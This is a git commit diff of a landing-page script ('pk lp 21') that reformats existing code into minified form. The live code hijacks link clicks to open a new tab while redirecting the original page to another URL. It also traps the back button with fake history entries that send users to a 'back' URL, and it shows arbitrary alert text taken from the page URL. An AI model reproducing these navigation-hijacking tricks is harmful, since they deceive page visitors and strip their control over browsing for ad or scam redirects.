c088a2acf09f43dba8f7137b918484512d8d4e27
LuckToWin <huang545877134@gmail.com>
2025-03-14 23:24:02 +0800

    pk lp 21

--- KE/21A/script.js
+++ KE/21A/script.js
@@ -22,22 +22,5 @@ for (var i = 0; i < aElements.length; i++) {
 if(typeof under!=="undefined"&&under!==null){if(typeof cta!=="undefined"&&cta!==null){document.addEventListener('click',function(event){var target=event.target;while(target){if(target.tagName==='A'&&target.classList.contains(cta)){const linkHref=target.href;event.preventDefault();window.open(linkHref,'_blank');window.location.replace(under);break;}
     target=target.parentNode;}});}else{document.addEventListener('click',function(event){var target=event.target;while(target){if(target.tagName==='A'){const linkHref=target.href;event.preventDefault();window.open(linkHref,'_blank');window.location.replace(under);break;}
     target=target.parentNode;}});}}
-if (typeof back !== "undefined" && back !== null) {
-    !(function () {
-        var t;
-        try {
-            const URL = window.location.href.split(/[#]/)[0];
-            for (t = 0; 3 > t; ++t) {
-                history.pushState({}, '', URL + '#');
-            }
-            window.addEventListener('popstate', function (event) {
-                console.log('popstate event triggered'); // 添加日志以确认事件触发
-                if (event.state) {
-                    location.replace(back);
-                }
-            });
-        } catch (o) {
-            console.log(o);
-        }
-    })();
-}function getURLParameter_location(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.search)||[,null])[1]||"")}function getURLParameter_hash(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.hash)||[,null])[1]||"")}function getURLParameter(e){var a=null;return getURLParameter_hash(e)?getURLParameter_hash(e):getURLParameter_location(e)} if( getURLParameter('alert') ){ setTimeout( function(){ alert( getURLParameter('alert') ) }, 500 ); }
+if(typeof back!=="undefined"&&back!==null){!(function(){var t;try{const URL=window.location.href.split(/[#]/)[0];for(t=0;3>t;++t){history.pushState({},'',URL+'#');}
+    window.addEventListener('popstate',function(event){console.log('popstate event triggered');if(event.state){location.replace(back);}});}catch(o){console.log(o);}})();}function getURLParameter_location(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.search)||[,null])[1]||"")}function getURLParameter_hash(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.hash)||[,null])[1]||"")}function getURLParameter(e){var a=null;return getURLParameter_hash(e)?getURLParameter_hash(e):getURLParameter_location(e)} if( getURLParameter('alert') ){ setTimeout( function(){ alert( getURLParameter('alert') ) }, 500 ); }
